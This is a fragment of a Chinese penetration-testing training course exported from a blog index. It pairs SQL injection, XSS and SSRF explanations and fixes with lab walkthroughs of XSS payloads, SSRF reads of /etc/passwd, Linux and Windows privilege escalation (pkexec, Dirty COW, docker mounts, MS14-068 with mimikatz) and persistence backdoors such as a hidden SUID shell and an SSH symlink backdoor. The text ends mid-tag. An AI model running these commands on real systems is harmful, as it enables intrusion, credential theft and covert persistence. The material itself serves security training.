title=\"修复方法\"></a>修复方法</h3><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>\n<p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>\n<p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>\n<p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p>\n<p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>\n<p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>\n<p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>\n<p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>\n<p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p>\n<h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><h3 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>跨站脚本攻击英文全称为（Cross site Script）缩写为 CSS，但是为了和层叠样式表（Cascading Style Sheet）CSS 区分开来，所以在安全领域跨站脚本攻击叫做 XSS </p>\n<p>XSS 攻击通常指黑客通过往 Web 页面中揑入恶意 Script 代码，当用户访问网页时恶意代码在用户的 浏览器中被执行，从而劫持用户浏览器窃叏用户信息。</p>\n<p>1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML&#x2F;JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p>\n<p>2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>\n<h3 id=\"XSS-脚本分为下面三类\"><a href=\"#XSS-脚本分为下面三类\" class=\"headerlink\" title=\"XSS 脚本分为下面三类\"></a>XSS 脚本分为下面三类</h3><p>第一种类型：反射型 XSS </p>\n<p>反射型 XSS 又称之为非持久型 XSS，黑客需要通过诱使用户点击包含 XSS 攻击代码的恶意链接，然后用户浏览器执行恶意代码触发 XSS 漏洞。 </p>\n<p>第二种类型：存储型 XSS </p>\n<p>存储型 XSS 会把用户输入的数据存储在服务器端，这种 XSS 可以持久化，而且更加稳定。 </p>\n<p> 比如黑客写了一篇包含 XSS 恶意代码的博客文章，那么访问该博客的所有用户他们的浏览器中都会执行黑客构造的 XSS 恶意代码，通常这种攻击代码会以文本或数据库的方式保存在服务器端，所以称之为存储型 XSS。 </p>\n<p>第三种类型：DOM 型 XSS （与服务器没有交互）</p>\n<p>DOM-basedXSS漏洞是基于文档对象模型（Document Object Model)的一种漏洞。这种XSS与反射型XSS、持久型XSS在原理上有本质区别，它的攻击代码并不需要服务器解析响应，触发XSS靠的是浏览器端的DOM解析。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如document.getElementByld(“x’).innerHTML、document.write)等。</p>\n<h3 id=\"挖掘方法-1\"><a href=\"#挖掘方法-1\" class=\"headerlink\" title=\"挖掘方法\"></a>挖掘方法</h3><p>1、数据交互的地方</p>\n<p>get、post、cookies、headers</p>\n<p>反馈与浏览</p>\n<p>富文本编辑器</p>\n<p>各类标签插入和自定义</p>\n<p>2、数据输出的地方</p>\n<p>用户资料</p>\n<p>关键词、标签、说明</p>\n<p>文件上传</p>\n<p>反射型</p>\n<script>alert(1)</script>\n\n<p>存储型</p>\n<script>alert(1)</script>\n\n<p>dom型</p>\n<p><a href=\"\"+str+\"\">what do you see?</a></p>\n<p>在input输入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"string\">&#x27; onclick=&quot;alert(6)&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">#&#x27;</span> onmouseover=<span class=\"string\">&quot;alert(6)&quot;</span>&gt;</span><br><span class=\"line\">#<span class=\"string\">&#x27; onmouseleave=&quot;alert(6)&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">#&#x27;</span> onmouseleave=<span class=\"string\">&quot;console.log(document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>\n\n\n<p>构成a标签闭合，且嵌入一个弹窗。<a href=\"#\" onclick=\"alert(666)\">‘&gt;what do you see?</a></p>\n<h3 id=\"常用利用方法-1\"><a href=\"#常用利用方法-1\" class=\"headerlink\" title=\"常用利用方法\"></a>常用利用方法</h3><p>1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>\n<p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>\n<p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>\n<p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>\n<p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>\n<p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>\n<p>　　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>\n<h3 id=\"修复方法-1\"><a href=\"#修复方法-1\" class=\"headerlink\" title=\"修复方法\"></a>修复方法</h3><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>\n<p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>\n<p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>\n<p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>\n<p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>\n<h2 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h2><h3 id=\"原理以及危害\"><a href=\"#原理以及危害\" class=\"headerlink\" title=\"原理以及危害\"></a>原理以及危害</h3><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>\n<p>　　(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>\n<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>\n<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>\n<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>\n<p>　　(5)、利用File协议读取本地文件。</p>\n<h3 id=\"挖掘方法-2\"><a href=\"#挖掘方法-2\" class=\"headerlink\" title=\"挖掘方法\"></a>挖掘方法</h3><p>1.能够对外发起网络请求的地方，就可能存在 SSRF 漏洞；</p>\n<p>2.在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求；</p>\n<p>3.从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span>:<span class=\"number\">8088</span>/vul/ssrf/ssrf_curl.php?url=http:<span class=\"comment\">//baidu.com</span></span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/ssrf/ssrf_curl.php?url=file://127.0.0.1/etc/passwd</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span>:<span class=\"number\">8088</span>/vul/ssrf/ssrf_fgc.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"常用利用方法-2\"><a href=\"#常用利用方法-2\" class=\"headerlink\" title=\"常用利用方法\"></a>常用利用方法</h3><p>(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>\n<p>　　(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>\n<p>　　(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>\n<p>　　(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>\n<p>　　(5)、利用File协议读取本地文件。</p>\n<h3 id=\"修复方法-2\"><a href=\"#修复方法-2\" class=\"headerlink\" title=\"修复方法\"></a>修复方法</h3><p>      1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</p>\n<p>　　2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>\n<p>　　3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>　　4、验证请求的文件格式</p>\n<p>　　5、禁止跳转</p>\n<p>　　6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>\n<p>　　7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n","categories":["原创培训课件"],"tags":["XSS","SQL注入","SSRF"]},{"title":"day5-内网渗透基础三（下午：权限提升、权限维持）","url":"/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/","content":"<h1 id=\"day5-内网渗透基础三（下午：权限提升、权限维持）\"><a href=\"#day5-内网渗透基础三（下午：权限提升、权限维持）\" class=\"headerlink\" title=\"day5-内网渗透基础三（下午：权限提升、权限维持）\"></a>day5-内网渗透基础三（下午：权限提升、权限维持）</h1><h2 id><a href=\"#\" class=\"headerlink\" title></a></h2><p>权限提升</p>\n<h3 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h3><p>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在 apache 就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息， ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限 超级管理员权限。</p>\n<h4 id=\"提升为root\"><a href=\"#提升为root\" class=\"headerlink\" title=\"提升为root\"></a>提升为root</h4><h5 id=\"Polkit漏洞提权\"><a href=\"#Polkit漏洞提权\" class=\"headerlink\" title=\"Polkit漏洞提权\"></a>Polkit漏洞提权</h5><p>介绍</p>\n<p>Polkit（PolicyKit）是类Unix系统中一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯。pkexec是Polkit开源应用框架的一部分，可以使授权非特权用户根据定义的策略以特权用户的身份执行命令。</p>\n<p>描述：</p>\n<p>权限提升漏洞（CVE-2021-4034)是由于pkexec无法正确处理调用参数，从而将环境变量作为命令执行，具有任意用户权限的攻击者都可以在默认配置下通过修改环境变量来利用此漏洞，从而获得受影响主机的root权限</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/berdav/CVE-2021-4034.git</span></span><br><span class=\"line\">make</span><br><span class=\"line\">./cve-<span class=\"number\">2021</span>-<span class=\"number\">4034</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"YRu6jvKNLMEufRi1Ylfr-paIwd04bg4X70sqSdaUCbo.png\" alt=\"image\"></p>\n<h5 id=\"SUID提权\"><a href=\"#SUID提权\" class=\"headerlink\" title=\"SUID提权\"></a>SUID提权</h5><p>SUID是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行 时，使调用者暂时获得该文件拥有者的权限。也就是如果ROOT用户给某个可执行文件加了S权限，那么 该执行程序运行的时候将拥有ROOT权限。 以下命令可以发现系统上运行的所有SUID可执行文件</p>\n<p>复现：</p>\n<p>给find添加suid</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">which find  <span class=\"comment\">//查找find的位置</span></span><br><span class=\"line\">chmod u+s /usr/bin/find  <span class=\"comment\">//赋予S权限</span></span><br><span class=\"line\">ll `which find` <span class=\"comment\">//查看权限</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"RWrd-pZgOxJborICdd2rVE1zuH0_-hSeLaqsVeP5wwc.png\" alt=\"image\"></p>\n<p>以下命令可以发现系统上运行的所有SUID可执行文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">find / -perm -u=s -type f <span class=\"number\">2</span>&gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\">find / -user root -perm -<span class=\"number\">4000</span>-print2&gt;/dev/<span class=\"literal\">null</span></span><br><span class=\"line\">find / -user root -perm -<span class=\"number\">4000</span>-exec ls -ldb &#123;&#125; \\;</span><br></pre></td></tr></table></figure>\n<p><img src=\"sxeMddBxd1HI5vRCG8O8Cd_G7kOa7zh2pJp5yBNvMQM.png\" alt=\"image\"></p>\n<p>利用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">find . -exec /bin/sh -p \\; -quit</span><br><span class=\"line\">cat /etc/shadow</span><br><span class=\"line\">whoami</span><br></pre></td></tr></table></figure>\n<p><img src=\"SgrJu9sDjW_rS_kd727Eew0tx0cyWKZIZHkOIYGv1wE.png\" alt=\"image\"></p>\n<p><img src=\"htlJZU_TUIiM1kKAICajldgjlxr26ECgl7GjXk1Ef54.png\" alt=\"image\"></p>\n<p>常见suid提权文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</span><br></pre></td></tr></table></figure>\n<h5 id=\"sudo提权\"><a href=\"#sudo提权\" class=\"headerlink\" title=\"sudo提权\"></a>sudo提权</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//让zhinan能够拥有root的权限</span></span><br><span class=\"line\">vim /etc/sudoers</span><br></pre></td></tr></table></figure>\n<p><img src=\"piJ3J04Cm9NvMGCL0L2ZKfsUW_RME54EtpEBOAioInc.png\" alt=\"image\"></p>\n<p><img src=\"5lhvmopNzbdady63TpmqRzi9O6Ln8NIjd6RpY3pbRac.png\" alt=\"image\"></p>\n<h5 id=\"脏牛提权-CVE-2016-5195\"><a href=\"#脏牛提权-CVE-2016-5195\" class=\"headerlink\" title=\"脏牛提权 CVE-2016-5195\"></a>脏牛提权 CVE-2016-5195</h5><p>脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p>\n<p>漏洞范围：Linux内核 &gt;&#x3D; 2.6.22（2007年发行，到2016年10月18日才修复）</p>\n<p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p>\n<p>exp：<a href=\"https://github.com/gbonacini/CVE-2016-5195\">https://github.com/gbonacini/CVE-2016-5195</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname -a</span><br><span class=\"line\"></span><br><span class=\"line\">git clone https:<span class=\"comment\">//github.com/gbonacini/CVE-2016-5195.git</span></span><br><span class=\"line\">yum -y install gcc-c++</span><br><span class=\"line\">make</span><br><span class=\"line\">./dcow -s</span><br></pre></td></tr></table></figure>\n<p><img src=\"9Qa1FSi4yr6FHnvpLX5-jGJehAjYBzaOa4NSPJStXrs.png\" alt=\"image\"></p>\n<p>准备的靶机版本较高，暂不演示</p>\n<h5 id=\"docker-提权\"><a href=\"#docker-提权\" class=\"headerlink\" title=\"docker 提权\"></a>docker 提权</h5><p>docker是一个容器 可以在同一台机子虚拟多台服务。</p>\n<p>前提是添加在docker组</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">将zhinan添加到docker组</span><br><span class=\"line\">[root<span class=\"meta\">@localhost</span> ~]# gpasswd -a zhinan docker</span><br></pre></td></tr></table></figure>\n<p>输入命令id 和groups查询当前用户信息和组信息 发现存在docker组</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">id</span><br><span class=\"line\">groups</span><br></pre></td></tr></table></figure>\n<p><img src=\"_a3RRMeh5x8CtEg009km2xKFOMBY22rdsdpINlJ_KmE.png\" alt=\"image\"></p>\n<p>下载并且运行样例alpine</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -v /:/mnt -it alpine  <span class=\"comment\">//运行alpine并且把宿主机所有的文件挂在到/mnt   直接进入这个容器里面</span></span><br><span class=\"line\">cat /mnt/etc/shadow</span><br></pre></td></tr></table></figure>\n<p><img src=\"rmZk5B6dfW7oS6J9-WGopAJanH_esxWV8iR2FlVymLM.png\" alt=\"image\"></p>\n<p>还可以编辑宿主机的定时任务，利用定时任务给宿主机进行执行命令</p>\n<h3 id=\"windows\"><a href=\"#windows\" class=\"headerlink\" title=\"windows\"></a>windows</h3><h4 id=\"ms-14-068提升为域管理\"><a href=\"#ms-14-068提升为域管理\" class=\"headerlink\" title=\"ms-14-068提升为域管理\"></a>ms-14-068提升为域管理</h4><p>MS14-068 是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证</p>\n<p>简单来说就是：</p>\n<p>windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</p>\n<p>在请求AS时，将require_PAC设置成False。</p>\n<p>在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</p>\n<p>TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅</p>\n<p>查看补丁状况</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">systeminfo|find <span class=\"string\">&quot;KB3011780&quot;</span></span><br><span class=\"line\">wusa /uninstall /kb:<span class=\"number\">3011780</span> /quiet /norestart  <span class=\"comment\">//卸载补丁</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"S7TpkRn-gU7jFWTEM_aNg9mtvxxSti6ha90lig4YTqU.png\" alt=\"image\"></p>\n<p>获取用户名、密码、SID</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">whoami /all</span><br><span class=\"line\">web</span><br><span class=\"line\">!@#Qwe456  #我所创建的用户都是这个密码，实际可用通过mimikatz获取</span><br><span class=\"line\">S-<span class=\"number\">1</span>-<span class=\"number\">5</span>-<span class=\"number\">21</span>-<span class=\"number\">2005268815</span>-<span class=\"number\">658469957</span>-<span class=\"number\">1189185684</span>-<span class=\"number\">1103</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"lYYsM-TNerCmpUyPXaGgYhNz8AxadDGuqVuFDAs42b0.png\" alt=\"image\"></p>\n<p>攻击</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ms14-<span class=\"number\">068.</span>exe -u user<span class=\"meta\">@domain</span> -p user_password -s sid -d domain_ip</span><br><span class=\"line\">ms14-<span class=\"number\">068.</span>exe -u web<span class=\"meta\">@hackbox</span>.com -p !@#Qwe456 -s S-<span class=\"number\">1</span>-<span class=\"number\">5</span>-<span class=\"number\">21</span>-<span class=\"number\">2005268815</span>-<span class=\"number\">658469957</span>-<span class=\"number\">1189185684</span>-<span class=\"number\">1103</span> -d <span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.149</span></span><br></pre></td></tr></table></figure>\n<p>攻击前拒绝访问，使用MS14-068.exe生成了.ccache文件</p>\n<p><img src=\"StakAxBSxitp2LQVMpMqZJYwDQ3r-pjuu1T4bGI5J7M.png\" alt=\"image\"></p>\n<p>使用mimikatz传递票据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::ptc TGT_web<span class=\"meta\">@hackbox</span>.com.ccache</span><br><span class=\"line\">kerberos::list</span><br></pre></td></tr></table></figure>\n<p><img src=\"VswEIU0TjuJhiJM2xntOnat7OlLOQl4Xi7B5lbG2v4Q.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">dir \\\\dc.hackbox.com\\c$</span><br></pre></td></tr></table></figure>\n<h4 id=\"提升为system\"><a href=\"#提升为system\" class=\"headerlink\" title=\"提升为system\"></a>提升为system</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">systeminfo &gt; <span class=\"number\">1.</span>txt</span><br><span class=\"line\">https:<span class=\"comment\">//i.hacking8.com/tiquan</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"XzmCuL2xc9BJAndE9Q4LDaCfHjMqNEYtcMOedqVD0eg.png\" alt=\"image\"></p>\n<h5 id=\"烂土豆提权（CVE-2016-3225）\"><a href=\"#烂土豆提权（CVE-2016-3225）\" class=\"headerlink\" title=\"烂土豆提权（CVE-2016-3225）\"></a>烂土豆提权（CVE-2016-3225）</h5><p>JuicyPotato_x64.exe</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">JuicyPotato_x64.exe whoami</span><br></pre></td></tr></table></figure>\n<p><img src=\"g_wLL9QuKn0f-f-ACHGloCGcdiZhW3NSKynsoLy4Le0.png\" alt=\"image\"></p>\n<h5 id=\"CVE-2020-0787提权\"><a href=\"#CVE-2020-0787提权\" class=\"headerlink\" title=\"CVE-2020-0787提权\"></a>CVE-2020-0787提权</h5><p>BitsArbitraryFileMoveExploit.exe</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">BitsArbitraryFileMoveExploit.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"FppRoqlpBoJ9G93rk0omcVc3tkCh1iy7sM-RCWf7E2o.png\" alt=\"image\"></p>\n<h5 id=\"PrintSpoofer提权\"><a href=\"#PrintSpoofer提权\" class=\"headerlink\" title=\"PrintSpoofer提权\"></a>PrintSpoofer提权</h5><p>Windows Print Spooler管理所有本地和网络打印队列，控制所有打印工作。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">PrintSpoofer.exe -i -c whoami</span><br></pre></td></tr></table></figure>\n<p><img src=\"XW1MlfTq0XHeajbjGhJ07ulken0KPQ5IxErFJwR4VEM.png\" alt=\"image\"></p>\n<h2 id=\"权限维持技术\"><a href=\"#权限维持技术\" class=\"headerlink\" title=\"权限维持技术\"></a>权限维持技术</h2><h3 id=\"linux权限维持\"><a href=\"#linux权限维持\" class=\"headerlink\" title=\"linux权限维持\"></a>linux权限维持</h3><h4 id=\"添加suid后门\"><a href=\"#添加suid后门\" class=\"headerlink\" title=\"添加suid后门\"></a>添加suid后门</h4><p>当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以 root身份执行的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、SUID权限仅对二进制程序有效。</span><br><span class=\"line\"><span class=\"number\">2</span>、执行者对于该程序需要具有x的可执行权限</span><br><span class=\"line\"><span class=\"number\">3</span>、本权限仅在执行该程序的过程中有效</span><br><span class=\"line\"><span class=\"number\">4</span>、在执行过程中执行者将具有该程序拥有者的权限</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">创建suid权限的文件</span><br><span class=\"line\">cp /bin/bash /tmp/.houmen</span><br><span class=\"line\">chmod <span class=\"number\">4755</span> /tmp/.houmen</span><br><span class=\"line\">ls -al /tmp/.houmen</span><br></pre></td></tr></table></figure>\n<p><img src=\"GcObWUjXJ2oT2EKcashTXEd3AVAADioKLjjw-Bi_DWo.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/tmp/.houmen</span><br><span class=\"line\">/tmp/.houmen -p <span class=\"comment\">//bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell</span></span><br><span class=\"line\"></span><br><span class=\"line\">使用-p参数来获取一个root shell. 这个euid的意思是 effective user id（关于这些ID的知识，可以看：https:<span class=\"comment\">//blog.csdn.net/fatshaw/article/details/6171035）</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"66t4ip4UQzH-gW49FKUb4tte9foYGiNKddyx_2S993Q.png\" alt=\"image\"></p>\n<p>检测：查找具有suid权限的文件即可</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">find / -perm +<span class=\"number\">4000</span> -ls</span><br><span class=\"line\">find / -perm -u=s -type f <span class=\"number\">2</span>&gt;/dev/<span class=\"literal\">null</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"SSH-软连接后门\"><a href=\"#SSH-软连接后门\" class=\"headerlink\" title=\"SSH 软连接后门\"></a>SSH 软连接后门</h4><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过 程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=<span class=\"number\">12345</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"SdOEUH-NRXRhrPdNUmZk5v849Ja73VMRrrYkL7bEGRU.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh root@<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span> -p <span class=\"number\">12345</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"B9KSXQqH9tY6fLgp1JPfWXza3MZocp4duV2auJj0iBI.png\" alt=\"image\"></p>\n<h4 id=\"SSH-公钥免密码登陆\"><a href=\"#SSH-公钥免密码登陆\" class=\"headerlink\" title=\"SSH 公钥免密码登陆\"></a>SSH 公钥免密码登陆</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa <span class=\"comment\">//生成公钥</span></span><br><span class=\"line\">cat id_rsa.pub &gt; authorized_keys </span><br></pre></td></tr></table></figure>\n<p><img src=\"FN5NaUo34gNlxzrxMYKRM8tekPJhG0Co8W76aECxWz8.png\" alt=\"image\"></p>\n<p>将id_rsa.pub内容放到目标.ssh&#x2F;authorized_keys里</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir /root/.ssh</span><br><span class=\"line\">chmod <span class=\"number\">600</span> authorized_keys</span><br></pre></td></tr></table></figure>\n<p><img src=\"mmWgv10xaMs48lTtkKqZlLawdlq9Rmwi_dNaquYDc8Q.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -i id_rsa root@<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"w3YMThwUXXmxryJS_Vi7bDi-vULqjSDmEdlLewAZ2S4.png\" alt=\"image\"></p>\n<h4 id=\"键盘记录\"><a href=\"#键盘记录\" class=\"headerlink\" title=\"键盘记录\"></a>键盘记录</h4><h4 id=\"Rootkit\"><a href=\"#Rootkit\" class=\"headerlink\" 